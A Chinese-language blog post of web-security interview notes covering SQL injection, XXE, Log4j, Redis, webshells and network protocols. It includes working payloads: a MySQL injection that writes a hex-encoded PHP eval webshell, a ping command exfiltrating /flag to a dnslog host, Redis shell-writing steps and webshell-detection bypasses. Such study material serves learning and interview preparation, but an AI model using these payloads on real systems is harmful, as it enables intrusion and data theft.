<h4 id="https详细过程"><a href="#https详细过程" class="headerlink" title="https详细过程"></a>https详细过程</h4><p>1.客户端通过SSL/TSL协议向服务端发发送自己支持的加密协议</p>
<p>2.服务端选择合适的加密协议并且返回证书,公钥</p>
<p>3.客户端通过根证书检验整数合法性</p>
<p>4.客户端生成对称密钥,通过公钥加密发送给服务器</p>
<p>5.服务器解密密文,获得对称密钥</p>
<p>6.双方都获得了对称密钥,开始通信</p>
<h4 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h4><p>1.通过多地ping判断是否存在cdn</p>
<p>2.一般子域名没有CDN加速,通过子域名获取真实ip</p>
<p>3.国内网站通过国外ping获取真实ip</p>
<p>4.历史DNS解析</p>
<p>5.通过icon利用网络空间搜索引擎查找</p>
<p>6.邮件系统寻找</p>
<p>7.信息泄露</p>
<p>8.如果直接ip不能访问,说明做了域名绑定</p>
<h4 id="linux-windows提权"><a href="#linux-windows提权" class="headerlink" title="linux/windows提权"></a>linux/windows提权</h4><p>1.linux提权:利用计划任务提权,suid提权,内核提权如脏牛提权</p>
<p>2.windows提权:利用最新漏洞,历史漏洞提权,用metasploit中的service_permissions模块</p>
<h4 id="浏览器输入一个url过程是什么样的，可能会产生哪些安全问题-https，中间人"><a href="#浏览器输入一个url过程是什么样的，可能会产生哪些安全问题-https，中间人" class="headerlink" title="浏览器输入一个url过程是什么样的，可能会产生哪些安全问题(https，中间人)"></a>浏览器输入一个url过程是什么样的，可能会产生哪些安全问题(https，中间人)</h4><p>浏览器在对一个url发起请求的过程:首先通过DNS解析对应的ip地址,通过三次握手与ip地址对应服务器建立TCP链接,建立连接后浏览器发送HTTP报文,服务器处理报文,做出响应,返回给浏览器资源,浏览器解析资源呈现给用户</p>
<p><strong>可能存在的安全问题</strong>http:在这个过程中都是暴露在互联网上的,我们可以随意截获浏览器发送的请求</p>
<p>使用HTTPS进行加密通信,可能存在中间人攻击,在建立https链接时服务器会向客户端返回公钥,这个时候中间人将这个公钥替换为自己的公钥即可控制两端的通信并且不会有所察觉,因为这个时候对于客户端和服务端来说她们都是在和中间人通信,这个时候就出现了证书来辅助验证公钥的合法性</p>
<h4 id="Log4j有关"><a href="#Log4j有关" class="headerlink" title="Log4j有关"></a>Log4j有关</h4><p>Log4j在处理不同日志等级的时候有不同的策略,在某些错误等级下会将带有${}的日志消息进行解析,payload形如XXXX:XXXXXX,底层原理是如果日志消息中存在形如${}的字符串,则取出中间的内容,并按照引号分割,引号左边则作为lookup类型,内置有11个lookup类,将其冒号右边的内容放入对应的lookup类进行执行,如jndi就会放入jndi的lookup类中,执行远程方法调用,此时伪造恶意远程服务器就可以造成反序列化漏洞从而RCE</p>
<h4 id="Struct执行流程"><a href="#Struct执行流程" class="headerlink" title="Struct执行流程"></a>Struct执行流程</h4><p>xxxxxxxxx</p>
<h4 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h4><p>1.XXE外部实体注入,如果目标开启外部实体并且存在可控的输入并且没有做出足够的过滤的话就能是使用一些为协议进行探测,文件读取</p>
<p><strong>攻击类型:</strong></p>
<p>1.inband(带内):读取文件,带内容</p>
<p>2.oob:通过dtd访问远程文件将数据带出</p>
<p>3.在目标不能联网通过报错的形式,先带出数据,然后使其后面的语句报错</p>
<p>**防御:**禁用外部实体</p>
<h4 id="JNDI解析流程意义及原理"><a href="#JNDI解析流程意义及原理" class="headerlink" title="JNDI解析流程意义及原理"></a>JNDI解析流程意义及原理</h4><p>JNDI,将java对象以某个名称的形式绑定到一个容器环境当中,以后调用容器环境的查找(lookup)就可以查找出某个名称绑定的java对象了,它可以降低配置参数和代码的耦合性</p>
<h4 id="shiro判断密钥是否正确"><a href="#shiro判断密钥是否正确" class="headerlink" title="shiro判断密钥是否正确"></a>shiro判断密钥是否正确</h4><p>当key错误的时候,rememberMe字段的值是deleteMe</p>
<h4 id="PHP常见cms的方法调用方式"><a href="#PHP常见cms的方法调用方式" class="headerlink" title="PHP常见cms的方法调用方式"></a>PHP常见cms的方法调用方式</h4><p>1.MVC框架,如thinkphp,通过路由的形式调用,如:模块/控制器/方法/参数/参数值</p>
<p>2.通过传递参数的形式决定调用哪一个类,以及类中的方法</p>
<h4 id="Thinkphp5路由设计思路"><a href="#Thinkphp5路由设计思路" class="headerlink" title="Thinkphp5路由设计思路"></a>Thinkphp5路由设计思路</h4><p>默认路由1.模块/控制器/行为/参数/参数值</p>
<p>开启强制路由就需要定义自己的路由,不能随便访问</p>
<h4 id="介绍自己的工具-idea的dnslog插件-nmap扫描器-语义分析插件等"><a href="#介绍自己的工具-idea的dnslog插件-nmap扫描器-语义分析插件等" class="headerlink" title="介绍自己的工具(idea的dnslog插件,nmap扫描器,语义分析插件等)"></a>介绍自己的工具(idea的dnslog插件,nmap扫描器,语义分析插件等)</h4><p>1.我用使用idea插件开发配合dnslog平台实现了dnslog触发弹窗提醒功能</p>
<p>2.基于nmap实现了对内网进行扫描存活ip地址并根据需求存储,探测其端口,web服务的title等字段,完成自动化信息搜集</p>
<h4 id="拿到一份代码-如何下手"><a href="#拿到一份代码-如何下手" class="headerlink" title="拿到一份代码,如何下手"></a>拿到一份代码,如何下手</h4><p>1.首先搭建本地环境,搭建debug测试环境,构造测试数据方便测试</p>
<p>2.大致阅读代码,查看是不是使用基于框架开发,</p>
<p>3.读程序执行流程,php站点着重查看如何执行不同的方法,方法调用逻辑等</p>
<p>4.由功能点定位代码,先看敏感权限功能如涉及文件上传,文件下载,文件删除,执行sql语句更改用户权限名称等高权限操作,看是否存在漏洞</p>
<p>5.挖越权,一般涉及越权的都是高权限页面如管理员页面等,许多框架/cms会写一个基类包含鉴权的代码,然后在每个控制器中继承这个基类,着重看有没有漏写的,或者看基类中的鉴权逻辑是否有问题</p>
<p>6.使用forify扫一下,根据给出的警示人工筛选</p>
<p>7.以上工作全都完成就需要</p>
<h4 id="如何判断这个站是哪一个框架写的-有源码-无源码-审计基于框架开发的代码需要注意什么-在审计过程中和审计不带有框架的代码有什么区别-关注点上有什么不同"><a href="#如何判断这个站是哪一个框架写的-有源码-无源码-审计基于框架开发的代码需要注意什么-在审计过程中和审计不带有框架的代码有什么区别-关注点上有什么不同" class="headerlink" title="如何判断这个站是哪一个框架写的(有源码,无源码),审计基于框架开发的代码需要注意什么?在审计过程中和审计不带有框架的代码有什么区别?关注点上有什么不同?"></a>如何判断这个站是哪一个框架写的(有源码,无源码),审计基于框架开发的代码需要注意什么?在审计过程中和审计不带有框架的代码有什么区别?关注点上有什么不同?</h4><p>无源码:</p>
<p>1.直接在页面底部看</p>
<p>2.尝试访问站点不存在的路由,触发报错信息</p>
<p>3.通过响应头,cookie字段判断</p>
<p>4.看url,如果请求类似.do就可能用了struct中间件</p>
<p>有源码:</p>
<p>1.java,看用了那些包,依赖</p>
<p>2.php,看文件/方法结构</p>
<h4 id="反序列化开始-入手点"><a href="#反序列化开始-入手点" class="headerlink" title="反序列化开始,入手点"></a>反序列化开始,入手点</h4><p>1.魔法函数,destruct,wakeup,construct,tostring</p>
<p>2.cookie处反序列化</p>
<h4 id="利用内网机器请求内网服务"><a href="#利用内网机器请求内网服务" class="headerlink" title="利用内网机器请求内网服务"></a>利用内网机器请求内网服务</h4><h4 id="PHP代码常见入口函数怎么找"><a href="#PHP代码常见入口函数怎么找" class="headerlink" title="PHP代码常见入口函数怎么找?"></a>PHP代码常见入口函数怎么找?</h4><p>1.一般根目录index.php会调用入口函数</p>
<h4 id="PHP变量覆盖-php两个等号和三个等号的区别-底层回答"><a href="#PHP变量覆盖-php两个等号和三个等号的区别-底层回答" class="headerlink" title="PHP变量覆盖,php两个等号和三个等号的区别(底层回答)"></a>PHP变量覆盖,php两个等号和三个等号的区别(底层回答)</h4><p>1.变量覆盖,extract,可以将前面的变量值进行修改</p>
<p>2.在==和===的底层实现中,由于php弱类型的原因,==的底层实现进行了很多的判断,和数据类型的转换,这就出现0E会被解析为科学计数法(0),0x会被解析为十六进制,正是php自己进行数据类型转换的过程导致了弱类型相等的漏洞出现,而===的底层实现就简单很多,不去做类型转换,只有在两边操作数类型一样的时候才会进行判断,否则不会判断</p>
<h4 id="redis利用方式"><a href="#redis利用方式" class="headerlink" title="redis利用方式"></a>redis利用方式</h4><p>1.未授权访问,写shell,config set 目录;config set dbfilename 要写文件的目录,set x “”写入内容,save,写shell</p>
<p>2.主从复制,通过加载.so文件</p>
<h4 id="任意文件下载如何利用"><a href="#任意文件下载如何利用" class="headerlink" title="任意文件下载如何利用"></a>任意文件下载如何利用</h4><p>1.下源码,审计漏洞</p>
<p>2.下数据库配置文件,尝试远程链接</p>
<p>3.下载敏感文件,信息搜集</p>
<h4 id="REC不出网-利用思路"><a href="#REC不出网-利用思路" class="headerlink" title="REC不出网,利用思路"></a>REC不出网,利用思路</h4><h4 id="判断对应目标用了什么数据库"><a href="#判断对应目标用了什么数据库" class="headerlink" title="判断对应目标用了什么数据库"></a>判断对应目标用了什么数据库</h4><p>1.通过sql报错来看</p>
<p>2.有源码或者任意文件下载拿到源码的话查看配置文件看查询语句,数据库配置文件等</p>
<h4 id="防止重放攻击"><a href="#防止重放攻击" class="headerlink" title="防止重放攻击"></a>防止重放攻击</h4><p>1.将时间戳进行加密</p>
<p>2.将接收到的参数进行hash,比对60秒内同以用户的hash是否一致</p>
<h4 id="JWT令牌"><a href="#JWT令牌" class="headerlink" title="JWT令牌"></a>JWT令牌</h4><p>1.头部-&gt;负载-&gt;签名组成,服务器每次将头部和负载拼接的结果按照自己的密钥加密放在第三部分(签名组成)</p>
<p>2.jwt伪造,如果通过各种途径泄露了jwt令牌密钥,或者密钥不长使用jwtcreacker,那么就能够利用密钥给自己签名,伪造jwt数据欺骗服务器</p>
<h4 id="AJAX发送POST发送几个数据包"><a href="#AJAX发送POST发送几个数据包" class="headerlink" title="AJAX发送POST发送几个数据包?"></a>AJAX发送POST发送几个数据包?</h4><p>1.2个数据包,一个装载头信息,一个装载POST正文</p>
<h4 id="AJAX如何发送post请求"><a href="#AJAX如何发送post请求" class="headerlink" title="AJAX如何发送post请求"></a>AJAX如何发送post请求</h4><p>1.创建异步对象xmlhttp</p>
<p>2.设置请求方式和地址</p>
<p>3.发送请求(如果是表单数据,需要使用setRequestsHeader添加HTTP头)</p>
<p>4.监听状态变化</p>
<p>5.处理返回结果</p>
<h4 id="自动化代码分析fortify-seay等-使用过吗-原理是什么"><a href="#自动化代码分析fortify-seay等-使用过吗-原理是什么" class="headerlink" title="自动化代码分析fortify,seay等,使用过吗,原理是什么?"></a>自动化代码分析fortify,seay等,使用过吗,原理是什么?</h4><p>1.使用过,fority是将代码统一为一种中间格式的语言代码,然后通过静态分析分析这种中间格式的语言代码从而分析其执行逻辑找出可能存在漏洞的地方</p>
<p>2.seay检测敏感函数</p>
<h4 id="windows横向移动"><a href="#windows横向移动" class="headerlink" title="windows横向移动"></a>windows横向移动</h4><h4 id="站库分离如何拿webshell"><a href="#站库分离如何拿webshell" class="headerlink" title="站库分离如何拿webshell"></a>站库分离如何拿webshell</h4><p>1.找其他入口点,文件上传等</p>
<h4 id="linux-windows命令-过滤文件-查看进程环境变量-看进程pid"><a href="#linux-windows命令-过滤文件-查看进程环境变量-看进程pid" class="headerlink" title="linux,windows命令:过滤文件,查看进程环境变量,看进程pid"></a>linux,windows命令:过滤文件,查看进程环境变量,看进程pid</h4><p>linux:</p>
<p>查进程:ps -aux | grep 进程名</p>
<p>-a 显示终端下执行的进程</p>
<p>-u 显示用户相关的进程</p>
<p>-x 显示所有进程</p>
<p>查端口:</p>
<p>lsof -i:xxx</p>
<p>查文件:</p>
<p>find 目录 / -name 文件名</p>
<p>查进程环境变量:</p>
<p>查进程号,然后</p>
<p>cat/proc/environ</p>
<p>windows:</p>
<p>查进程</p>
<p>netstat -ano</p>
<p>a:端口</p>
<p>n:显示地址和端口号</p>
<p>o:显示pid</p>
<p>查端口</p>
<p>netstat -ano | findstr xxx</p>
<p>杀进程</p>
<p>taskkill -pid</p>
<h4 id="Python多线程-python多线程锁"><a href="#Python多线程-python多线程锁" class="headerlink" title="Python多线程,python多线程锁"></a>Python多线程,python多线程锁</h4><p>1.GLI锁会影响多线程性能</p>
<p>2.多进程multiprocessing</p>
<h4 id="如何检测webshell"><a href="#如何检测webshell" class="headerlink" title="如何检测webshell"></a>如何检测webshell</h4><p>1.检测敏感函数</p>
<p>2.通过访问量进行筛查</p>
<p>3.请求UA单一</p>
<p>4.访问时间在非工作时间</p>
<p>动态沙箱检测</p>
<h4 id="webshell检测绕过"><a href="#webshell检测绕过" class="headerlink" title="webshell检测绕过"></a>webshell检测绕过</h4><p>1.HIDS文件内容缓存绕过，文件名hash碰撞</p>
<p>2.PHP旧版本中preg类函数如preg_replace存在修饰符e，会将替换后的结果放入eval函数执行,</p>
<p>preg_replace函数的第一个参数支持传入字符串或者数组，传入数组可绕过引擎检测</p>
<p>php底层对第一个参数的处理是跳过对\n，空格，这两个字符的判断的，我们可以构造preg_replace(‘\n\n\ne\n\n\n’,’\0’,$shell)来绕过引擎</p>
<h4 id="攻击溯源思路"><a href="#攻击溯源思路" class="headerlink" title="攻击溯源思路"></a>攻击溯源思路</h4><h4 id="DNS协议安全问题"><a href="#DNS协议安全问题" class="headerlink" title="DNS协议安全问题"></a>DNS协议安全问题</h4><h4 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h4><p>简单请求：向服务器发起请求，加上origin给服务器检查，服务器返回cors头给浏览器，浏览器检查cors头，如果包含了当前的一个源则放行，否则拦截</p>
<p>复杂请求：在进行简单请求的基础上发起真正请求，返回数据</p>
<h4 id="遇到过比较难的CTF题目"><a href="#遇到过比较难的CTF题目" class="headerlink" title="遇到过比较难的CTF题目"></a>遇到过比较难的CTF题目</h4><p>1.线下题目,go语言,有一个文件上传结构,拿到源码审计后发现有一个参数可以可控环境变量,文件上传满5个使用curl命令请求另外一个端口的服务清楚文件夹内容,直接想到了LD_PRELOAD劫持动态链接库劫持curl命令</p>
<p>2.HTTP请求走私,利用gunicorn 请求走私,前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为HTTP规范提供了两种不同的方法来指定请求的结束位置，即 <code>Content-Length</code> 和 <code>Transfer-Encoding</code> 标头。</p>
<p>CL不为0,CL-CL(两个cl),CL-TE(后端忽略cl,处理TE),TE-CL(前端TE,后端CL),TE-TE(都是TE,但是可能容错性不一样)</p>
<h4 id="CTF经历："><a href="#CTF经历：" class="headerlink" title="CTF经历："></a>CTF经历：</h4><p>最开始就通过打一些难度不是特别大的比赛hackgame，新生赛，BUUCTF办的比赛来培养兴趣，对网络安全有了一定的认知后开始尝试打一打国外的比赛以及国内的大比赛像湖湘，强网，王鼎，全国大学生，战队办的N1CTF,D3CTF等，国内企业办的pwnhub，虽然不一定能做出来很多题，但是每次都会有提升，会学到新的trick</p>
<h4 id="分享trick"><a href="#分享trick" class="headerlink" title="分享trick"></a>分享trick</h4><p>P牛：环境变量注入，在centenos下由于控制ENV $()可执行命令的问题，利用BASH_FUNC_XXX%%创建函数然后执行bash -c 执行xxx函数，导致直接命令执行</p>
<p>环境变量WGETRC可指定wget</p>
<p>环境变量ld_preload</p>
<p>构造出错的压缩包</p>
<h2 id="sql注入基础类"><a href="#sql注入基础类" class="headerlink" title="sql注入基础类:"></a>sql注入基础类:</h2><h4 id="mysql8新特性table-value"><a href="#mysql8新特性table-value" class="headerlink" title="mysql8新特性table/value"></a>mysql8新特性table/value</h4><p>table绕过select过滤,table不支持where字句</p>
<p>values</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id=0 union <span class="keyword">values</span> <span class="keyword">row</span>(<span class="keyword">database</span>())</span><br><span class="line"><span class="number">0</span> ||(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;&#x27;</span>)&lt;(<span class="keyword">table</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span>)<span class="comment">#字段数</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">0</span> <span class="keyword">union</span> <span class="keyword">values</span> <span class="keyword">row</span>(<span class="keyword">load_file</span>(<span class="string">&#x27;/flag&#x27;</span>))<span class="comment">#读文件</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">0</span> <span class="keyword">union</span> <span class="keyword">values</span> <span class="keyword">row</span>(<span class="number">0x3c3f706870</span> <span class="number">406576616</span>c28245f504f53545b315d293b3f3e)</span><br><span class="line"> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">&#x27;/var/www/html/shell.php&#x27;</span><span class="comment">#写shell</span></span><br><span class="line"> (<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;a&#x27;</span>) &lt;(<span class="keyword">table</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span> <span class="keyword">offset</span> <span class="number">1</span>);<span class="comment">#盲注</span></span><br></pre></td></tr></table></figure>

<h4 id="sql注入爆库-表-字段"><a href="#sql注入爆库-表-字段" class="headerlink" title="sql注入爆库,表,字段"></a>sql注入爆库,表,字段</h4><p>information_schema存储了库.表,字段</p>
<p>如果被BAN了,在MYSQL5.7中</p>
<p>如果有自增ID,则使用视图sys.schema_auto_increment_columns</p>
<p>如果没有自增ID,使用schema_table_statistics_with_buffer,x$schema_table_statistics_with_buffer(I/O延迟时间)</p>
<p>如果开启innodb引擎,可以通过 mysql.innodb_table_stats,mysql_innodb_table_index,默认不开</p>
<p>通过无列名注入注字段,join</p>
<h4 id="sql注入原理"><a href="#sql注入原理" class="headerlink" title="sql注入原理"></a>sql注入原理</h4><p>sql注入是代码在与数据库交互的过程中执行的sql语句中存在用户可控的字段,输入恶意内容即可闭合原有sql语句和产生新的sql语义,导致恶意用户可以直接控制执行的sql语句从而造成注入</p>
<h4 id="dnslog外带数据"><a href="#dnslog外带数据" class="headerlink" title="dnslog外带数据"></a>dnslog外带数据</h4><p>Mysql:loadfile函数,只能用于windows系统,secure_file_priv=””,因为windows系统支持UNC路径,带出时使用hex编码,确保dns正常解析</p>
<h4 id="dnslog原理"><a href="#dnslog原理" class="headerlink" title="dnslog原理"></a>dnslog原理</h4><p>dnslog是存储在DNS服务器上的域名信息，记录着对域名的访问信息，也就是说我们对a.com这个域名的请求信息会被记录，此时我们将参数拼接到三级域名上，b.a.com，你那么就会记录下这次dns解析请求，从而带出数据</p>
<p>在不一样的环境下利用不同方法带出数据</p>
<p>命令执行：</p>
<p>| 管道：上一条命令的结果作为吓一跳命令的输入</p>
<p>|| 上一条命令失败后执行</p>
<p>&amp; 后台运行</p>
<p>&amp;&amp; 上一条命令成功后执行</p>
<p>a=`cat /flag | base32` &amp;&amp; b=${a//=/} &amp;&amp; echo &amp;&amp;ping $b.1232a822.toxiclog.xyz</p>
<p>java环境：</p>
<p>sys:java.verison</p>
<p>sys:user.dir</p>
<p>java:os</p>
<p>env:HOSTNAME</p>
<p>windows环境</p>
<p>%COMPUTERNAME%</p>
<p>%OS%</p>
<p>%USERNAME%</p>
<p>等</p>
<h4 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h4><h5 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h5><p>1.预编译:预编译的原理:一个正常的sql语句执行流程是:被mysql解析为语法树,预处理器验证语法树,然后执行,在传入参数的过程中sql语句已经被解析为语法树了,无论输入和等数据,语法树不会再变化,从而杜绝sql注入的发生</p>
<p>2.不当使用可能会造成注入,没有按照参数绑定来进行预编译</p>
<p>3.表明,列名不能被预编译,预处理器在检查生成的语法树时会检查表是否存在,所以表名,列名不能作为占位符</p>
<p>4.order By后的数据和排序方式ASE/DESC也不能被预编译</p>
<h5 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h5><p>1.过滤关键字,敏感数据</p>
<h5 id="对返回的值进行过滤"><a href="#对返回的值进行过滤" class="headerlink" title="对返回的值进行过滤"></a>对返回的值进行过滤</h5><p>1.在返回数据时进行过滤,即使出现sql注入也能防止回显,保证数据不被窃取</p>
<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><p>1.在一个站点的某处sql处向数据库插入了恶意语句,即便语句被转义</p>
<p>2.站点在其他地方调用该处数据时没有将取出的数据做判断直接拼接使用,造成注入</p>
<p>防御:1.从数据库中取出数据时仍然需要进行转义,不能轻易相信</p>
<h4 id="遇到order-by怎么防御"><a href="#遇到order-by怎么防御" class="headerlink" title="遇到order by怎么防御"></a>遇到order by怎么防御</h4><p>白名单,只允许白名单中的字段进入order by后的字段</p>
<h4 id="转义字符防御时遇到列名或者表明就带有特殊字符应该怎么办"><a href="#转义字符防御时遇到列名或者表明就带有特殊字符应该怎么办" class="headerlink" title="转义字符防御时遇到列名或者表明就带有特殊字符应该怎么办"></a>转义字符防御时遇到列名或者表明就带有特殊字符应该怎么办</h4><p>用占位符先占位,等完成拼接并转义后在替换回去</p>
<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>两个字节的字符就是宽字节,输入特殊字符的时候被转义函数转义,出现%5C(转义符),由于mysql各层的字符集设置不相同,导致在取出数据的时候用新的字符集去解析,将原本的转义符编码和其他字符编码组合形成两个字节的编码形成宽字节进行解析(%df%5c就是汉字運),从而绕过转义符的判断</p>
<p>使用mysql_set_charset指定字符集，同时使用mysql_real_escape_string对其进行转移转义,可以避免字符集不相同导致的%df和%5c发生拼接冲突的问题</p>
<h4 id="过滤””怎么办"><a href="#过滤””怎么办" class="headerlink" title="过滤””怎么办"></a>过滤””怎么办</h4><p>1.宽字节注入绕过</p>
<p>2.16进制编码，查询的数据是16进制的话不用使用引号引起来</p>
<h4 id="过滤空格怎么办"><a href="#过滤空格怎么办" class="headerlink" title="过滤空格怎么办"></a>过滤空格怎么办</h4><p>1.多行注释/**/绕过</p>
<p>2.%09(tab)</p>
<p>3.()绕过</p>
<p>4.回车%0a,%0d绕过</p>
<p>5./*!….*/内敛注释绕过</p>
<h4 id="过滤-怎么办"><a href="#过滤-怎么办" class="headerlink" title="过滤=怎么办"></a>过滤=怎么办</h4><p>1.like,rlike代替等号</p>
<p>2.regexp正则比较</p>
<p>3.&lt;&gt;等价于!=，所以!(&lt;&gt;)即可代表=</p>
<h4 id="过滤or-and怎么办"><a href="#过滤or-and怎么办" class="headerlink" title="过滤or/and怎么办"></a>过滤or/and怎么办</h4><p>1.and &amp;&amp;</p>
<p>2.or ||</p>
<p>3.not !</p>
<p>4.xor |</p>
<h4 id="过滤union-select等关键字怎么办"><a href="#过滤union-select等关键字怎么办" class="headerlink" title="过滤union,select等关键字怎么办"></a>过滤union,select等关键字怎么办</h4><p>1.双写</p>
<p>2,大小写</p>
<p>3.url编码绕过</p>
<h4 id="过滤-怎么办-1"><a href="#过滤-怎么办-1" class="headerlink" title="过滤,怎么办"></a>过滤,怎么办</h4><p>1.在substr(“string”,1,3)逗号使用中使用 ”被截取字符串“from 1 for 3</p>
<p>2.在limit中的limit 0,3使用offset绕过,limit 3 offset 0</p>
<h4 id="过滤查询关键字怎么办如select-from-xxx-where-username-“admin”过滤了admin"><a href="#过滤查询关键字怎么办如select-from-xxx-where-username-“admin”过滤了admin" class="headerlink" title="过滤查询关键字怎么办如select * from xxx where username = “admin”过滤了admin"></a>过滤查询关键字怎么办如select * from xxx where username = “admin”过滤了admin</h4><p>1.十六进制绕过</p>
<h4 id="时间盲注ban了sleep怎么办"><a href="#时间盲注ban了sleep怎么办" class="headerlink" title="时间盲注ban了sleep怎么办"></a>时间盲注ban了sleep怎么办</h4><p>1.执行时间耗时较大的运算如benchmark，计算两个很大的数据库的笛卡尔积</p>
<h4 id="过滤了substr-怎么办"><a href="#过滤了substr-怎么办" class="headerlink" title="过滤了substr()怎么办"></a>过滤了substr()怎么办</h4><p>1.LPAD(str,len,padstr)</p>
<p>2.MID()</p>
<h4 id="盲注除了时间-bool还有什么方法"><a href="#盲注除了时间-bool还有什么方法" class="headerlink" title="盲注除了时间,bool还有什么方法"></a>盲注除了时间,bool还有什么方法</h4><p>1.regexp盲注</p>
<h4 id="mysql写webshell的原理是什么-写shell的前提是什么"><a href="#mysql写webshell的原理是什么-写shell的前提是什么" class="headerlink" title="mysql写webshell的原理是什么,写shell的前提是什么?"></a>mysql写webshell的原理是什么,写shell的前提是什么?</h4><p>1.mysql的load_file函数可以将查询结果写入文件，前提是mysql用户必须拥有FILE权限，并且secure_file_priv为空，或路径为web路径</p>
<p>2.mysql写日志，打开日志记录-&gt;修改日志保存文件为web目录-&gt;执行带有shell的命令-&gt;getshell</p>
<h4 id="UDF提权"><a href="#UDF提权" class="headerlink" title="UDF提权"></a>UDF提权</h4><p>1.UDF提权利用mysql的用户自定义函数时使用SONAME关键字加载.so文件，so文件中定义一个和mysql中的同名函数并实现命令执行代码，mysql便可以通过自定义函数执行任意命令，如果mysql是以ROOT用户启动的，那么就可以使用ROOT权限执行命令达到提权的作用</p>
<h2 id="协议类"><a href="#协议类" class="headerlink" title="协议类:"></a>协议类:</h2><h4 id="ICMP协议"><a href="#ICMP协议" class="headerlink" title="ICMP协议"></a>ICMP协议</h4><p>ICMP协议是一个网络层协议,和IP协议同层,确认IP包是否到达指定ip,返回错误信息</p>
<h4 id="ARP协议-ARP欺骗"><a href="#ARP协议-ARP欺骗" class="headerlink" title="ARP协议/ARP欺骗:"></a>ARP协议/ARP欺骗:</h4><p>arp协议用来解析地址,他会通过在本地缓存查找,如果没有会继续在局域网内进行广播从查找对应ip地址主机的对应mac地址</p>
<p>由于arp协议是以广播的形式发送的,局域网内的其他主机可以自主应答ARP协议的消息,这个时候恶意主机就可以恶意的应答一些消息,使错误的ip地址与mac地址的关系存入发送arp请求的arp本地缓存当中,造成欺骗</p>
<p>原来的请求过程是PC1-&gt;网关-&gt;互联网,然后pc2进行arp欺骗,在pc1进行更新本地arp缓存的时候发送应答将pc2的mac地址发送给pc1,建立错误的arp表关系,以后PC1再次访问网关就会被重定向到PC2处,PC1的所有流量丢都会被PC2所劫持</p>
<h4 id="ARP欺骗防范"><a href="#ARP欺骗防范" class="headerlink" title="ARP欺骗防范"></a>ARP欺骗防范</h4><p>1.防火墙监控</p>
<p>2.静态ARP表</p>
<p>3.使用代理</p>
<h4 id="网络模型"><a href="#网络模型" class="headerlink" title="网络模型"></a>网络模型</h4><p>OSI七层网络模型</p>
<p>物理层-&gt;数据链路层-&gt;网络层-&gt;传输层-&gt;会话层-&gt;表示层-&gt;应用层</p>
<h4 id="TCP-IP握手"><a href="#TCP-IP握手" class="headerlink" title="TCP/IP握手"></a>TCP/IP握手</h4><p>三次握手</p>
<p>1.客户端发起SYN</p>
<p>2.服务端返回SYN+ACK表示确认收到了,ACK+1,表示一次确认</p>
<p>3.客户端再次返回给服务端ACK,此时ACK+1,表示二次确认</p>
<p>四次挥手</p>
<p>1.客户端发出FIN请求断开连接,附带seq字段表示本次数据序列</p>
<p>2.服务器回复ack表示已经收到数据,ACK表示以正确收到断开连接请求</p>
<p>3.服务器回复客户端seq表示本次数据序列号,同时回复FIN请求表示没有数据需要发给客户端了,请求断开链接</p>
<p>4.客户端回复ack确认收到对应序列号的数据了,客户端回复ACK表示正确收到服务器发送的断开链接请求</p>
<h4 id="UDP"><a href="#UDP" class="headerlink" title="UDP"></a>UDP</h4><p>UDP是基于IP的简单协议,不用建立链接就可以带着目的端口和源端口进行通信</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Mengd@</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://men9da.cn/2022/04/18/2022%E9%9D%A2%E7%BB%8F%E6%80%BB%E7%BB%93/">https://men9da.cn/2022/04/18/2022%E9%9D%A2%E7%BB%8F%E6%80%BB%E7%BB%93/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://men9da.cn" target="_blank">Mengd@</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%A2%E8%AF%95/">面试</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2022/06/08/%E8%AE%B0%E4%B8%80%E6%AC%A1lmxcms%E5%AE%A1%E8%AE%A1/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">记一次lmxcms审计</div></div></a></div><div class="next-post pull-right"><a href="/2022/04/17/Log4j-RCE%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"><img class="next-cover" src="https://s1.ax1x.com/2022/04/17/LUFaFK.png" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Log4j-RCE源码分析</div></div></a></div></nav></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img 